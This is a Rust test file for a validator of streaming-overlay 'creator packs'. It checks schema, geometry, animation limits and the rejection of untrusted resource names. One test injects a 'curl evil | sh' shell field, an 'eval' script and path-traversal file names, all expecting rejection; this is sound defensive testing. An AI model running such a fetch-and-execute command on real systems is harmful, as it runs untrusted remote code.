use motive_show_control::packs::*;
use std::collections::BTreeSet;

const MATCHDAY: &str = include_str!("../examples/packs/matchday.json");
fn pack() -> CreatorPack {
    CreatorPack::from_json(MATCHDAY).unwrap()
}
#[test]
fn all_original_packs_validate_and_propose_only() {
    for fixture in [
        MATCHDAY,
        include_str!("../examples/packs/creator-tech.json"),
        include_str!("../examples/packs/neon-arena.json"),
    ] {
        let p = CreatorPack::from_json(fixture).unwrap();
        let plan = p.plan(&Capability::h12_contracts()).unwrap();
        assert!(!plan.executable);
        assert!(plan.requires_idle);
        assert!(plan.unavailable.is_empty());
        assert!(p.scenes.len() <= 8);
        assert!(p.overlays.len() <= 16);
        assert!(p.scenes.iter().map(|s| s.layers.len()).sum::<usize>() <= 32);
        assert_eq!(
            plan.steps
                .iter()
                .filter(|s| matches!(s, PlanStep::CreateOverlay { .. }))
                .count(),
            p.overlays.len()
        );
        assert_eq!(
            plan.steps
                .iter()
                .filter(|s| matches!(s, PlanStep::SetTransform { .. }))
                .count(),
            p.scenes.iter().map(|s| s.layers.len()).sum::<usize>() * 2
        );
    }
}
#[test]
fn malformed_unknown_missing_and_oversized_schema_are_rejected() {
    for input in ["{", "{}", "[]", "null"] {
        assert!(CreatorPack::from_json(input).is_err());
    }
    let mut value: serde_json::Value = serde_json::from_str(MATCHDAY).unwrap();
    value["schema_version"] = 2.into();
    assert!(CreatorPack::from_json(&value.to_string()).is_err());
    value["schema_version"] = 1.into();
    value["shell"] = "curl evil | sh".into();
    assert!(CreatorPack::from_json(&value.to_string()).is_err());
    value.as_object_mut().unwrap().remove("shell");
    value["overlays"][0]["definition"]["script"] = "eval".into();
    assert!(CreatorPack::from_json(&value.to_string()).is_err());
    assert!(CreatorPack::from_json(&" ".repeat(MAX_MANIFEST_BYTES + 1)).is_err());
}
#[test]
fn unsupported_capabilities_are_visible_never_silently_installed() {
    let mut p = pack();
    p.requires.insert(Capability::Soundboard);
    p.requires.insert(Capability::VoiceRecognition);
    let plan = p.plan(&Capability::h12_contracts()).unwrap();
    assert_eq!(
        plan.unavailable,
        vec![Capability::Soundboard, Capability::VoiceRecognition]
    );
    assert!(!plan.executable);
    let empty_plan = p.plan(&BTreeSet::new()).unwrap();
    assert!(empty_plan.unavailable.contains(&Capability::Text));
}
#[test]
fn malformed_references_duplicates_and_incomplete_packs_fail() {
    let mut p = pack();
    p.scenes[0].layers[0].overlay_id = "missing".into();
    assert!(p.validate().is_err());
    let mut p = pack();
    p.overlays.push(p.overlays[0].clone());
    assert!(p.validate().is_err());
    let mut p = pack();
    p.scenes.clear();
    assert!(p.validate().is_err());
    let mut p = pack();
    p.animations[0].layer_id = "missing".into();
    assert!(p.validate().is_err());
    let mut p = pack();
    p.requires.remove(&Capability::Text);
    assert!(p.validate().is_err());
    let mut p = pack();
    p.rule_ids.push(p.rule_ids[0].clone());
    assert!(p.validate().is_err());
}
#[test]
fn untrusted_resources_cannot_become_paths_urls_or_executables() {
    for name in [
        "../image.png",
        "/tmp/image.png",
        "https://example.com/a.png",
        "file:///a.png",
        "x\\a.png",
        ".hidden.png",
        "a..png",
        "payload.sh",
        "a.svg",
        "a.html",
    ] {
        let mut p = pack();
        p.budget.max_resource_bytes = 100;
        p.resources.push(Resource {
            id: "r".into(),
            file_name: name.into(),
            kind: ResourceKind::Image,
            sha256: "0".repeat(64),
            bytes: 100,
            width: 100,
            height: 100,
            duration_ms: None,
        });
        assert!(p.validate().is_err(), "must reject {name}");
    }
    let mut p = pack();
    p.budget.max_resource_bytes = 100;
    p.resources.push(Resource {
        id: "r".into(),
        file_name: "image.png".into(),
        kind: ResourceKind::Image,
        sha256: "0".repeat(64),
        bytes: 100,
        width: 100,
        height: 100,
        duration_ms: None,
    });
    let plan = p.plan(&Capability::h12_contracts()).unwrap();
    assert!(matches!(
        plan.steps[0],
        PlanStep::ImportAssetAfterLocalAuthorization { .. }
    ));
    assert!(!plan.executable);
}
#[test]
fn typed_property_edit_is_transactional_and_reflected_in_plan() {
    let mut p = pack();
    p.set_property("score", PropertyValue::Text("HOME   2 : 1   AWAY".into()))
        .unwrap();
    let plan = p.plan(&Capability::h12_contracts()).unwrap();
    assert!(plan.steps.iter().any(|s|matches!(s,PlanStep::CreateOverlay{source_ref,definition:VisualDefinition::Text{text,..},..} if source_ref=="scoreboard" && text=="HOME   2 : 1   AWAY")));
    let before = p.clone();
    assert!(
        p.set_property("score", PropertyValue::Color(0xffffff))
            .is_err()
    );
    assert_eq!(p, before);
    assert!(
        p.set_property("score", PropertyValue::Text("x".repeat(5000)))
            .is_err()
    );
    assert_eq!(p, before);
}
#[test]
fn geometry_boundaries_and_nonfinite_numbers_are_rejected() {
    let mut p = pack();
    for bad in [f32::NAN, f32::INFINITY, f32::NEG_INFINITY, 4097.0, -4097.0] {
        p.scenes[0].layers[0].horizontal.x = bad;
        assert!(p.validate().is_err());
    }
    p.scenes[0].layers[0].horizontal.x = 4096.0;
    assert!(p.validate().is_ok());
    for bad in [0.0, -1.0, 4097.0] {
        p.scenes[0].layers[0].horizontal.width = bad;
        assert!(p.validate().is_err());
    }
}
#[test]
fn all_native_animation_limits_and_text_budget_are_enforced() {
    let mut p = pack();
    p.animations[0].kind = AnimationKind::FadeIn;
    assert!(p.validate().is_err());
    p.animations[0].easing = Easing::Linear;
    assert!(p.validate().is_ok());
    for duration in [0, 99, 10001, u32::MAX] {
        p.animations[0].duration_ms = duration;
        assert!(p.validate().is_err());
    }
    p.animations[0].duration_ms = 100;
    assert!(p.validate().is_ok());
    let mut p = pack();
    p.budget.max_estimated_texture_bytes = 1;
    assert!(p.validate().is_err());
    let mut p = pack();
    p.budget.max_simultaneous_animations = 9;
    assert!(p.validate().is_err());
}
#[test]
fn manifest_roundtrip_preserves_every_layout_and_identifier() {
    let p = pack();
    let restored = CreatorPack::from_json(&serde_json::to_string(&p).unwrap()).unwrap();
    assert_eq!(p, restored);
    assert!(
        p.scenes
            .iter()
            .flat_map(|s| &s.layers)
            .all(|l| l.horizontal != l.vertical)
    );
}
#[test]
fn controlled_boundary_property_sweep() {
    for width in 0..=4097 {
        let layout = Layout {
            x: 0.0,
            y: 0.0,
            width: width as f32,
            height: 1.0,
            visible: true,
            order: 0,
        };
        assert_eq!(layout.validate().is_ok(), (1..=4096).contains(&width));
    }
    for order in 0..=64 {
        let layout = Layout {
            x: 0.0,
            y: 0.0,
            width: 1.0,
            height: 1.0,
            visible: true,
            order,
        };
        assert_eq!(layout.validate().is_ok(), order < 32);
    }
}

#[test]
fn native_names_reject_empty_control_and_overlong_values() {
    for name in ["", "   ", "scene\nname", &"a".repeat(81)] {
        let mut p = pack();
        p.scenes[0].name = name.into();
        assert!(p.validate().is_err());
        let mut p = pack();
        p.overlays[0].name = name.into();
        assert!(p.validate().is_err());
    }
}

#[test]
fn layer_symbols_are_unique_across_the_whole_proposed_graph() {
    let mut p = pack();
    p.scenes[1].layers[0].id = p.scenes[0].layers[0].id.clone();
    assert!(p.validate().is_err());
}
